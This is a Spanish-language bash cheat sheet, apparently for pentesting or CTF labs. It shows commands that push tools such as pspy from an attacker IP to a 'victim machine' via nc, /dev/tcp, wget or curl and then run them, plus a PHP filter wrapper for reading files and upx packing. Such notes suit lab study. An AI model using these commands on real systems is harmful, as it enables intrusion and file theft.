----------
- Tags: #tutorial #bash #terminal #comands #oneliner #info 
-------------

- ### Ver Version de SO
```bash
lsb_release -a
```

- ### Ver kernel de SO
```bash
uname -a
```


-------------------------


### Transferencia Archivos podemos Tranferirlo a la maquina victima usando:

# IMPORTANTE ESTAR EN */tmp*

- Desde nuestro equipo en escucha y ofreciendo el archivo *pspy*
```bash
nc -nlvp 443 < pspy
```

- Desde la maquina victima leemos lo que ofrece nuestra maquina (archivo pspy):
```bash
cat < /dev/tcp/192.168.3.10/443 > pspy
```

- ### Comprobar Transferencia correcta del archivo: 
```
md5sum pspy 
//Salida de comando: 88b43b16187976296c543526e1cb606f  pspy
```

Por lo cual aplicar el comando tambien en nuestra maquina para ver que el hash sea *exactamente* el mismo, lo cual significa que se tranfirio correctamente
- Por ultimo darle permismos de Ejecucion y ejecutar para ver los procesos realiados en tiempo real:

```bash
chmod +x pspy
./pspy
```


## Metodo 2 Transferir archivo a la maquina:
```bash
//Desde nuestra maquina 
python3 -m http.server 80
```

```bash
//Desde la maquina victima
wget 192.168.3.10/nombreArchivo
//con CURL
curl 192.168.3.10/nombreArchivo -o nombreArchivo
```

------------------------

- Eliminar Interfaz Red
```bash
sudo ip link set eth0 down
sudo ip link delete eth0
```

- Aplicar Decodificacion *Root13*
```bash
echo "Tu cadena a cifrar" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

- Compilar archivo *C*
```bash
gcc source_file. c -o program_name
```

- Ver peso de un ejecutable:
```bash
du -hc <archivo>
```

- Reducir Peso sin afectar funcionalidad
```bash
upx brute <archivo>
```

- *PHP* Wrapper
```bash
php://filter/convert.base64-encode/resource=<archivo>
```
